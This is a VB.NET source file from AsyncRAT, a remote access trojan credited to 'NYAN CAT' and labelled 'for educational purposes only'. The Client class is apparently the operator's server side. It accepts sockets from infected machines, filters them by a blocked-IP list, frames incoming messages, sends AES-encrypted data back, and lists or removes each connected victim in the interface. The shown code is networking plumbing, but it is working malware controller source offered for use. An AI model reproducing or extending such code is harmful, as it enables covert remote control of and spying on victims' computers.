Imports System.IO
Imports System.Net.Sockets

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.

Public Class Client

    Public C As Socket = Nothing
    Public S As Server = Nothing
    Public IsConnected As Boolean = False
    Public BufferLength As Long = Nothing
    Public Buffer() As Byte = Nothing
    Public MS As MemoryStream = Nothing
    Public IP As String = Nothing
    Public L As ListViewItem = Nothing

    Sub New(ByVal CL As Socket, SR As Server)

        C = CL
        S = SR
        C.ReceiveBufferSize = 8192
        C.SendBufferSize = 8192
        IsConnected = True
        BufferLength = -1
        Buffer = New Byte(0) {}
        MS = New MemoryStream
        IP = CL.RemoteEndPoint.ToString

        If S.Blocked.Contains(IP.Split(":")(0)) Then
            isDisconnected()
            Return
        Else
            C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
        End If

    End Sub

    Async Sub BeginReceive(ByVal ar As IAsyncResult)
        If IsConnected = False Then isDisconnected()
        Try
            Dim Received As Integer = C.EndReceive(ar)
            If Received > 0 Then
                If BufferLength = -1 Then
                    If Buffer(0) = 0 Then
                        BufferLength = BS(MS.ToArray)
                        MS.Dispose()
                        MS = New MemoryStream

                        If BufferLength = 0 Then
                            BufferLength = -1
                            C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
                            Exit Sub
                        End If
                        Buffer = New Byte(BufferLength - 1) {}
                    Else
                        Await MS.WriteAsync(Buffer, 0, Buffer.Length)
                    End If
                Else
                    Await MS.WriteAsync(Buffer, 0, Received)
                    If (MS.Length = BufferLength) Then
                        Dim ClientReq As New Incoming_Requests(Me, MS.ToArray)
                        Pending.Req_In.Add(ClientReq)
                        BufferLength = -1
                        MS.Dispose()
                        MS = New MemoryStream
                        Buffer = New Byte(0) {}
                    Else
                        Buffer = New Byte(BufferLength - MS.Length - 1) {}
                    End If
                End If
            Else
                isDisconnected()
                Exit Sub
            End If
            C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
        Catch ex As Exception
            Debug.WriteLine("BeginReceive " + ex.Message)
            isDisconnected()
            Exit Sub
        End Try
    End Sub

    Async Sub BeginSend(ByVal Data As Byte())
        Try
            Using MS As New MemoryStream
                Dim b As Byte() = AES_Encryptor(Data)
                Dim L As Byte() = SB(b.Length & CChar(vbNullChar))
                Await MS.WriteAsync(L, 0, L.Length)
                Await MS.WriteAsync(b, 0, b.Length)

                C.Poll(-1, SelectMode.SelectWrite)
                C.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
            End Using
        Catch ex As Exception
            Debug.WriteLine("BeginSend " + ex.Message)
            isDisconnected()
        End Try
    End Sub

    Sub EndSend(ByVal ar As IAsyncResult)
        Try
            C.EndSend(ar)
        Catch ex As Exception
            Debug.WriteLine("EndSend " + ex.Message)
        End Try
    End Sub

    Delegate Sub _isDisconnected()
    Sub isDisconnected()

        IsConnected = False

        Try
            If L IsNot Nothing Then
                If Messages.F.InvokeRequired Then
                    Messages.F.Invoke(New _isDisconnected(AddressOf isDisconnected))
                    Exit Sub
                Else
                    L.Remove()
                    Messages.ClinetLog(Me, "Disconnected", Color.Red)
                End If
            End If
        Catch ex As Exception
            Debug.WriteLine("L.Remove " + ex.Message)
        End Try

        Try
            C.Close()
            C.Dispose()
        Catch ex As Exception
            Debug.WriteLine("C.Close " + ex.Message)
        End Try

        Try
            MS.Close()
            MS.Dispose()
        Catch ex As Exception
            Debug.WriteLine("MS.Dispose " + ex.Message)
        End Try

    End Sub

End Class
